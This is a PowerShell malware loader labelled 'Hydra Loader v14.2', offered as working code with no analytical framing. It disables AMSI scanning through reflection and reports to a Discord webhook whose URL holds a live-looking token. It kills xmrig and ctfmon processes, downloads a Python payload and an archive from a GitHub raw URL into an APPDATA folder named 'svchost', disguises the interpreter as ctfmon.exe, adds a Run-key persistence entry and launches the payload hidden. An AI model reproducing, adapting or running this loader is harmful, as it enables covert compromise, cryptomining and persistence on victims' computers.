# --- THE AGGRESSIVE HYDRA LOADER (V14.2 - LOCK BREAK) ---
# 0. BLIND THE WATCHDOG (NEW SYNTAX)
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}

$WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# 1. AGGRESSIVE CLEANUP (Breaking Locks)
Send-Ghost "Aggressive Clean Initiated. Breaking File Locks..."
if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue) { Stop-Process -Name "ctfmon" -Force; Start-Sleep -s 2 }
if (Get-Process -Name "xmrig" -ErrorAction SilentlyContinue) { Stop-Process -Name "xmrig" -Force; Start-Sleep -s 2 }

if (Test-Path $Path) { 
    try { Remove-Item $Path -Recurse -Force -ErrorAction Stop } 
    catch { Send-Ghost "WARNING: Could not clear path. Retrying..." }
}
if (!(Test-Path $Path)) { md $Path > $null }

# 2. LANDING THE HYDRA
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
$zipPath = "$Path\mui_cache.zip"
Invoke-WebRequest -Uri $Z_URL -OutFile $zipPath

# Safe Extraction
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
foreach ($entry in $zip.Entries) {
    $target = [System.IO.Path]::Combine($Path, $entry.FullName)
    if ($target.EndsWith("\")) { if (!(Test-Path $target)) { md $target > $null } }
    else {
        if (!(Test-Path ([System.IO.Path]::GetDirectoryName($target)))) { md ([System.IO.Path]::GetDirectoryName($target)) > $null }
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
    }
}
$zip.Dispose()
Remove-Item $zipPath -Force

# 3. PERSISTENCE
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $ID -Value "`"$PY_MASK`" `"$Path\WinServices.py`""

# 4. ENGAGE
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
Send-Ghost "Hydra v14.2 Online. Aggressive Landing Complete."
